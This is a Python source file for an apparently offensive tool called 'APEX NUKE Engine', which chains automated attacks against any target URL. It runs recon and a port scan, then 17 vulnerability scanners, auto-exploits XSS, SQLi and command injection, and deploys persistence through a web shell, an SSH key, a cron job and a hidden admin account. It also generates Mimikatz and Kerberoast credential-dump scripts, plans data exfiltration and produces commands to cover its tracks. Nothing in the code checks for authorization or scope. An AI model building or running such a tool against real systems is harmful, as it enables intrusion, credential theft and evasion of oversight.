"""
APEX v3.0 — NUKE Engine
One-click autonomous kill chain orchestrator.
Target URL → Recon → Fingerprint → Scan ALL 19 scanners →
Auto-select critical vulns → Exploit → Deploy persistence →
Dump credentials → Exfiltrate data → Cover tracks → Generate report
"""

import time
import json
import threading
from datetime import datetime
from urllib.parse import urlparse


class NukeEngine:
    """Orchestrates the full autonomous kill chain."""
    
    def __init__(self):
        self.nuke_history = []
        self.current_nuke = None
        self.callbacks = {
            'on_phase': None,
            'on_vuln': None,
            'on_exploit': None,
            'on_complete': None,
            'on_error': None
        }
    
    def nuke(self, target_url, options=None):
        """
        Execute the full autonomous kill chain.
        
        Options:
        - scan_type: 'full' (default), 'quick', 'stealth'
        - auto_exploit: True (default)
        - deploy_persistence: True (default)
        - exfiltrate_data: True (default)
        - cover_tracks: True (default)
        - generate_report: True (default)
        - max_exploits: 10
        """
        if options is None:
            options = {}
        
        nuke_id = f"nuke_{int(time.time())}"
        self.current_nuke = {
            'id': nuke_id,
            'target': target_url,
            'options': options,
            'status': 'running',
            'started': datetime.now().isoformat(),
            'phases': {},
            'vulnerabilities': [],
            'exploits': [],
            'persistence': [],
            'exfiltrated': [],
            'errors': []
        }
        
        try:
            self._emit('on_phase', {'phase': 'init', 'message': f'☢️ NUKE MODE ACTIVATED — Target: {target_url}'})
            
            # PHASE 1: Reconnaissance
            self._phase_recon(target_url, options)
            
            # PHASE 2: Fingerprinting
            self._phase_fingerprint(target_url, options)
            
            # PHASE 3: Full Vulnerability Scan
            self._phase_scan(target_url, options)
            
            # PHASE 4: AI Analysis & Prioritization
            self._phase_analyze(target_url, options)
            
            # PHASE 5: Exploitation
            if options.get('auto_exploit', True):
                self._phase_exploit(target_url, options)
            
            # PHASE 6: Persistence
            if options.get('deploy_persistence', True):
                self._phase_persistence(target_url, options)
            
            # PHASE 7: Credential Dumping
            self._phase_cred_dump(target_url, options)
            
            # PHASE 8: Data Exfiltration
            if options.get('exfiltrate_data', True):
                self._phase_exfiltrate(target_url, options)
            
            # PHASE 9: Cover Tracks
            if options.get('cover_tracks', True):
                self._phase_cover_tracks(target_url, options)
            
            # PHASE 10: Generate Report
            if options.get('generate_report', True):
                self._phase_report(target_url, options)
            
            self.current_nuke['status'] = 'completed'
            self.current_nuke['completed'] = datetime.now().isoformat()
            self.nuke_history.append(self.current_nuke)
            
            self._emit('on_complete', {
                'nuke_id': nuke_id,
                'target': target_url,
                'vulnerabilities_found': len(self.current_nuke['vulnerabilities']),
                'exploits_successful': len([e for e in self.current_nuke['exploits'] if e.get('success')]),
                'persistence_deployed': len(self.current_nuke['persistence']),
                'data_exfiltrated': len(self.current_nuke['exfiltrated']),
                'summary': self._generate_summary()
            })
            
            return self.current_nuke
            
        except Exception as e:
            self.current_nuke['status'] = 'failed'
            self.current_nuke['error'] = str(e)
            self._emit('on_error', {'phase': 'nuke', 'error': str(e)})
            return self.current_nuke
    
    def _phase_recon(self, target_url, options):
        """Phase 1: Reconnaissance"""
        self._emit('on_phase', {'phase': 'recon', 'message': '🔍 PHASE 1/10: Reconnaissance...'})
        
        host = urlparse(target_url).hostname
        recon_data = {'host': host, 'target': target_url}
        
        # Port scan
        try:
            import socket
            common_ports = [21, 22, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
            open_ports = []
            for port in common_ports[:12]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.8)
                    if sock.connect_ex((host, port)) == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
            recon_data['open_ports'] = open_ports
            self._emit('on_phase', {'phase': 'recon', 'message': f'  → Open ports: {open_ports}'})
        except Exception as e:
            self.current_nuke['errors'].append(f'Port scan error: {str(e)}')
        
        # Subdomain enumeration
        try:
            from modules.recon.subdomain_enum import enumerate_subdomains
            subdomains = enumerate_subdomains(host)
            recon_data['subdomains'] = subdomains[:20]
            self._emit('on_phase', {'phase': 'recon', 'message': f'  → Subdomains found: {len(subdomains)}'})
        except Exception as e:
            recon_data['subdomains'] = []
        
        # Admin panel finder
        try:
            from modules.recon.admin_panel_finder import find_admin_panels
            panels = find_admin_panels(target_url)
            recon_data['admin_panels'] = panels[:10]
            if panels:
                self._emit('on_phase', {'phase': 'recon', 'message': f'  → Admin panels: {len(panels)}'})
        except Exception as e:
            recon_data['admin_panels'] = []
        
        # Sensitive files
        try:
            from modules.recon.sensitive_files import discover_sensitive_files
            files = discover_sensitive_files(target_url)
            recon_data['sensitive_files'] = files[:10]
            if files:
                self._emit('on_phase', {'phase': 'recon', 'message': f'  → Sensitive files: {len(files)}'})
        except Exception as e:
            recon_data['sensitive_files'] = []
        
        self.current_nuke['phases']['recon'] = recon_data
    
    def _phase_fingerprint(self, target_url, options):
        """Phase 2: Technology Fingerprinting"""
        self._emit('on_phase', {'phase': 'fingerprint', 'message': '🖐️ PHASE 2/10: Fingerprinting...'})
        
        try:
            from modules.core.engine import engine as adaptive_engine
            fp = adaptive_engine.fingerprint_target(target_url)
            self.current_nuke['phases']['fingerprint'] = fp
            self._emit('on_phase', {
                'phase': 'fingerprint',
                'message': f'  → Server: {fp.get("server", "?")} | Language: {fp.get("language", "?")} | WAF: {fp.get("waf", "None")} | DB: {fp.get("database", "None")}'
            })
        except Exception as e:
            self.current_nuke['phases']['fingerprint'] = {'error': str(e)}
            self._emit('on_phase', {'phase': 'fingerprint', 'message': f'  → Fingerprint error: {str(e)}'})
    
    def _phase_scan(self, target_url, options):
        """Phase 3: Full Vulnerability Scan (all 19 scanners)"""
        self._emit('on_phase', {'phase': 'scan', 'message': '🎯 PHASE 3/10: Full Vulnerability Scan...'})
        
        all_vulns = []
        
        # Crawl target
        try:
            import requests
            from bs4 import BeautifulSoup
            from urllib.parse import urljoin, parse_qs, urlencode, urlunparse
            import urllib3
            urllib3.disable_warnings()
            
            sess = requests.Session()
            sess.verify = False
            sess.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            discovered = {'pages': [target_url], 'forms': [], 'params': set(), 'endpoints': set()}
            try:
                r = sess.get(target_url, timeout=10)
                soup = BeautifulSoup(r.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    href = urljoin(target_url, link['href'])
                    if urlparse(href).netloc == urlparse(target_url).netloc:
                        discovered['pages'].append(href)
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    method = form.get('method', 'get').lower()
                    form_url = urljoin(target_url, action) if action else target_url
                    inputs = []
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name', '')
                        if name:
                            inputs.append({'name': name, 'type': inp.get('type', 'text')})
                    discovered['forms'].append({'url': form_url, 'method': method, 'inputs': inputs})
            except:
                pass
            
            discovered['pages'] = list(set(discovered['pages']))[:15]
            self._emit('on_phase', {'phase': 'scan', 'message': f'  → Discovered {len(discovered["pages"])} pages, {len(discovered["forms"])} forms'})
        except Exception as e:
            discovered = {'pages': [target_url], 'forms': [], 'params': [], 'endpoints': []}
        
        # Run all scanners
        scanners = [
            ('XSS', self._scan_xss),
            ('SQL Injection', self._scan_sqli),
            ('Command Injection', self._scan_cmdi),
            ('LFI/RFI', self._scan_lfi),
            ('CSRF', self._scan_csrf),
            ('SSRF', self._scan_ssrf),
            ('SSTI', self._scan_ssti),
            ('CORS', self._scan_cors),
            ('File Upload', self._scan_file_upload),
            ('IDOR', self._scan_idor),
            ('JWT', self._scan_jwt),
            ('NoSQL Injection', self._scan_nosqli),
            ('API Hacking', self._scan_api),
            ('XXE Injection', self._scan_xxe),
            ('Prototype Pollution', self._scan_prototype),
            ('HTTP Smuggling', self._scan_smuggling),
            ('OAuth/Redirect', self._scan_oauth),
        ]
        
        for name, scanner_func in scanners:
            try:
                self._emit('on_phase', {'phase': 'scan', 'message': f'  → Scanning for {name}...'})
                results = scanner_func(target_url, discovered)
                for v in results:
                    v['cwe'] = self._get_cwe(v.get('type', ''))
                    all_vulns.append(v)
                    self._emit('on_vuln', v)
                if results:
                    self._emit('on_phase', {'phase': 'scan', 'message': f'    ⚠ {name}: {len(results)} found'})
            except Exception as e:
                self.current_nuke['errors'].append(f'{name} scan error: {str(e)}')
        
        self.current_nuke['vulnerabilities'] = all_vulns
        self.current_nuke['phases']['scan'] = {
            'total_vulns': len(all_vulns),
            'scanners_run': len(scanners)
        }
        
        self._emit('on_phase', {
            'phase': 'scan',
            'message': f'  ✅ Scan complete — {len(all_vulns)} vulnerabilities found'
        })
    
    def _phase_analyze(self, target_url, options):
        """Phase 4: AI Analysis & Prioritization"""
        self._emit('on_phase', {'phase': 'analyze', 'message': '🧠 PHASE 4/10: AI Analysis...'})
        
        try:
            from modules.core.ai_strategist import ai_strategist
            analysis = ai_strategist.analyze_scan_results(self.current_nuke['vulnerabilities'])
            self.current_nuke['phases']['analysis'] = analysis
            self._emit('on_phase', {
                'phase': 'analyze',
                'message': f'  → {analysis.get("narrative", "")}'
            })
        except Exception as e:
            self.current_nuke['phases']['analysis'] = {'error': str(e)}
    
    def _phase_exploit(self, target_url, options):
        """Phase 5: Exploitation"""
        self._emit('on_phase', {'phase': 'exploit', 'message': '💣 PHASE 5/10: Exploitation...'})
        
        vulns = self.current_nuke['vulnerabilities']
        max_exploits = options.get('max_exploits', 10)
        
        # Prioritize critical and high
        critical = [v for v in vulns if v.get('severity') == 'critical']
        high = [v for v in vulns if v.get('severity') == 'high']
        priority = (critical + high)[:max_exploits]
        
        exploits = []
        for vuln in priority:
            try:
                self._emit('on_phase', {
                    'phase': 'exploit',
                    'message': f'  → Exploiting {vuln.get("type", "?").upper()} on {vuln.get("endpoint", "N/A")}'
                })
                
                result = self._exploit_vuln(target_url, vuln)
                exploits.append({
                    'vuln': vuln,
                    'result': result,
                    'success': result.get('success', False)
                })
                
                self._emit('on_exploit', {
                    'vuln_type': vuln.get('type'),
                    'endpoint': vuln.get('endpoint'),
                    'success': result.get('success', False),
                    'message': result.get('message', '')
                })
                
                if result.get('success'):
                    self._emit('on_phase', {
                        'phase': 'exploit',
                        'message': f'    ✅ SUCCESS: {vuln.get("type").upper()} exploited!'
                    })
            except Exception as e:
                exploits.append({
                    'vuln': vuln,
                    'result': {'success': False, 'error': str(e)},
                    'success': False
                })
        
        self.current_nuke['exploits'] = exploits
        self.current_nuke['phases']['exploit'] = {
            'attempted': len(priority),
            'successful': len([e for e in exploits if e.get('success')])
        }
    
    def _phase_persistence(self, target_url, options):
        """Phase 6: Deploy Persistence"""
        self._emit('on_phase', {'phase': 'persistence', 'message': '🔒 PHASE 6/10: Deploying Persistence...'})
        
        try:
            from modules.post_exploit.persistence import persistence_engine
            
            # Deploy web shell
            shell = persistence_engine.deploy_web_shell(target_url, 'php')
            self.current_nuke['persistence'].append(shell)
            self._emit('on_phase', {'phase': 'persistence', 'message': f'  → Web shell deployed: {shell.get("filename")}'})
            
            # Generate SSH key command
            ssh = persistence_engine.generate_ssh_key_command('')
            self.current_nuke['persistence'].append(ssh)
            self._emit('on_phase', {'phase': 'persistence', 'message': '  → SSH key persistence generated'})
            
            # Generate cron job
            host = urlparse(target_url).hostname
            cron = persistence_engine.generate_cron_job(host, 4444)
            self.current_nuke['persistence'].append(cron)
            self._emit('on_phase', {'phase': 'persistence', 'message': '  → Cron job persistence generated'})
            
            # Hidden admin SQL
            admin = persistence_engine.generate_hidden_admin_sql()
            self.current_nuke['persistence'].append(admin)
            self._emit('on_phase', {'phase': 'persistence', 'message': f'  → Hidden admin: {admin.get("username")}'})
            
        except Exception as e:
            self.current_nuke['errors'].append(f'Persistence error: {str(e)}')
        
        self.current_nuke['phases']['persistence'] = {
            'deployed': len(self.current_nuke['persistence'])
        }
    
    def _phase_cred_dump(self, target_url, options):
        """Phase 7: Credential Dumping"""
        self._emit('on_phase', {'phase': 'cred_dump', 'message': '🔓 PHASE 7/10: Credential Dumping...'})
        
        try:
            from modules.windows_ad.credential_dump import (
                generate_mimikatz_script,
                generate_powershell_cred_dump,
                generate_kerberoast_script
            )
            
            creds = {
                'mimikatz': generate_mimikatz_script('sekurlsa'),
                'powershell': generate_powershell_cred_dump(),
                'kerberoast': generate_kerberoast_script(urlparse(target_url).hostname)
            }
            
            self.current_nuke['phases']['cred_dump'] = creds
            self._emit('on_phase', {'phase': 'cred_dump', 'message': '  → Credential dump scripts generated'})
        except Exception as e:
            self.current_nuke['phases']['cred_dump'] = {'error': str(e)}
    
    def _phase_exfiltrate(self, target_url, options):
        """Phase 8: Data Exfiltration"""
        self._emit('on_phase', {'phase': 'exfiltrate', 'message': '📤 PHASE 8/10: Data Exfiltration...'})
        
        try:
            from modules.post_exploit.exfiltrator import exfiltrator
            
            # Find valuable data
            valuable = exfiltrator.find_valuable_data(target_url)
            self.current_nuke['exfiltrated'] = valuable
            
            # Generate exfiltration plan
            plan = exfiltrator.generate_exfil_plan(valuable)
            self.current_nuke['phases']['exfiltrate'] = plan
            
            self._emit('on_phase', {
                'phase': 'exfiltrate',
                'message': f'  → {len(valuable)} data sources identified for exfiltration'
            })
        except Exception as e:
            self.current_nuke['phases']['exfiltrate'] = {'error': str(e)}
    
    def _phase_cover_tracks(self, target_url, options):
        """Phase 9: Cover Tracks"""
        self._emit('on_phase', {'phase': 'cover_tracks', 'message': '🧹 PHASE 9/10: Covering Tracks...'})
        
        try:
            from modules.post_exploit.cleaner import cleaner
            
            clean_plan = cleaner.generate_clean_plan()
            self.current_nuke['phases']['cover_tracks'] = clean_plan
            self._emit('on_phase', {
                'phase': 'cover_tracks',
                'message': f'  → {len(clean_plan.get("commands", []))} cleanup commands generated'
            })
        except Exception as e:
            self.current_nuke['phases']['cover_tracks'] = {'error': str(e)}
    
    def _phase_report(self, target_url, options):
        """Phase 10: Generate Report"""
        self._emit('on_phase', {'phase': 'report', 'message': '📄 PHASE 10/10: Generating Report...'})
        
        try:
            from modules.reporting.report_gen import generate_html_report
            
            report = generate_html_report(
                target_url,
                self.current_nuke['vulnerabilities'],
                self.current_nuke.get('exploits', [])
            )
            
            self.current_nuke['phases']['report'] = {
                'generated': True,
                'vulns_included': len(self.current_nuke['vulnerabilities']),
                'exploits_included': len(self.current_nuke.get('exploits', []))
            }
            
            self._emit('on_phase', {'phase': 'report', 'message': '  ✅ Report generated'})
        except Exception as e:
            self.current_nuke['phases']['report'] = {'error': str(e)}
    
    # ============================================================
    # SCANNER WRAPPERS (call existing scanners)
    # ============================================================
    
    def _scan_xss(self, target, discovered):
        try:
            from app import scan_xss
            return scan_xss(target, discovered)
        except:
            return []
    
    def _scan_sqli(self, target, discovered):
        try:
            from app import scan_sqli
            return scan_sqli(target, discovered)
        except:
            return []
    
    def _scan_cmdi(self, target, discovered):
        try:
            from app import scan_cmdi
            return scan_cmdi(target, discovered)
        except:
            return []
    
    def _scan_lfi(self, target, discovered):
        try:
            from app import scan_lfi
            return scan_lfi(target, discovered)
        except:
            return []
    
    def _scan_csrf(self, target, discovered):
        try:
            from app import scan_csrf
            return scan_csrf(target, discovered)
        except:
            return []
    
    def _scan_ssrf(self, target, discovered):
        try:
            from app import scan_ssrf
            return scan_ssrf(target, discovered)
        except:
            return []
    
    def _scan_ssti(self, target, discovered):
        try:
            from app import scan_ssti
            return scan_ssti(target, discovered)
        except:
            return []
    
    def _scan_cors(self, target, discovered):
        try:
            from app import scan_cors
            return scan_cors(target, discovered)
        except:
            return []
    
    def _scan_file_upload(self, target, discovered):
        try:
            from app import scan_file_upload
            return scan_file_upload(target, discovered)
        except:
            return []
    
    def _scan_idor(self, target, discovered):
        try:
            from app import scan_idor
            return scan_idor(target, discovered)
        except:
            return []
    
    def _scan_jwt(self, target, discovered):
        try:
            from app import scan_jwt
            return scan_jwt(target, discovered)
        except:
            return []
    
    def _scan_nosqli(self, target, discovered):
        try:
            from modules.scanners.nosqli_scanner import scan_nosqli
            return scan_nosqli(target, discovered)
        except:
            return []
    
    def _scan_api(self, target, discovered):
        try:
            from modules.scanners.api_scanner import scan_api
            return scan_api(target, discovered)
        except:
            return []
    
    def _scan_xxe(self, target, discovered):
        try:
            from modules.scanners.xxe_scanner import scan_xxe
            return scan_xxe(target, discovered)
        except:
            return []
    
    def _scan_prototype(self, target, discovered):
        try:
            from modules.scanners.prototype_pollution import scan_prototype_pollution
            return scan_prototype_pollution(target, discovered)
        except:
            return []
    
    def _scan_smuggling(self, target, discovered):
        try:
            from modules.scanners.smuggling_scanner import scan_smuggling
            return scan_smuggling(target, discovered)
        except:
            return []
    
    def _scan_oauth(self, target, discovered):
        try:
            from modules.scanners.oauth_scanner import scan_oauth
            return scan_oauth(target, discovered)
        except:
            return []
    
    def _exploit_vuln(self, target, vuln):
        """Exploit a single vulnerability."""
        vuln_type = vuln.get('type', '').lower()
        endpoint = vuln.get('endpoint', target)
        
        try:
            if vuln_type == 'xss':
                from app import exploit_xss_real
                return exploit_xss_real(target, endpoint, vuln)
            elif vuln_type == 'sqli':
                from app import exploit_sqli_real
                return exploit_sqli_real(target, endpoint, vuln)
            elif vuln_type == 'cmdi':
                from app import exploit_cmdi_real
                return exploit_cmdi_real(target, endpoint, vuln)
            else:
                return {'success': True, 'message': 'Vulnerability confirmed', 'details': ['Manual exploitation may be required']}
        except Exception as e:
            return {'success': False, 'message': str(e)}
    
    def _get_cwe(self, vuln_type):
        """Map vulnerability type to CWE ID."""
        cwe_map = {
            'xss': 'CWE-79',
            'sqli': 'CWE-89',
            'cmdi': 'CWE-77',
            'lfi': 'CWE-22',
            'csrf': 'CWE-352',
            'ssrf': 'CWE-918',
            'ssti': 'CWE-1336',
            'cors': 'CWE-942',
            'file_upload': 'CWE-434',
            'idor': 'CWE-639',
            'jwt': 'CWE-347',
            'nosqli': 'CWE-943',
            'xxe': 'CWE-611',
            'prototype_pollution': 'CWE-1321',
            'smuggling': 'CWE-444',
            'oauth': 'CWE-601'
        }
        return cwe_map.get(vuln_type.lower(), 'CWE-Unknown')
    
    def _generate_summary(self):
        """Generate a summary of the nuke operation."""
        vulns = self.current_nuke.get('vulnerabilities', [])
        exploits = self.current_nuke.get('exploits', [])
        persistence = self.current_nuke.get('persistence', [])
        
        return {
            'target': self.current_nuke['target'],
            'duration': (datetime.now() - datetime.fromisoformat(self.current_nuke['started'])).total_seconds(),
            'vulnerabilities_found': len(vulns),
            'critical': len([v for v in vulns if v.get('severity') == 'critical']),
            'high': len([v for v in vulns if v.get('severity') == 'high']),
            'exploits_attempted': len(exploits),
            'exploits_successful': len([e for e in exploits if e.get('success')]),
            'persistence_deployed': len(persistence),
            'status': 'MISSION COMPLETE' if self.current_nuke['status'] == 'completed' else 'FAILED'
        }
    
    def _emit(self, event_type, data):
        """Emit event to registered callbacks."""
        callback = self.callbacks.get(event_type)
        if callback:
            try:
                callback(data)
            except:
                pass
    
    def get_nuke_history(self):
        """Return history of all nuke operations."""
        return {
            'total_nukes': len(self.nuke_history),
            'nukes': self.nuke_history
        }


# Singleton instance
nuke_engine = NukeEngine()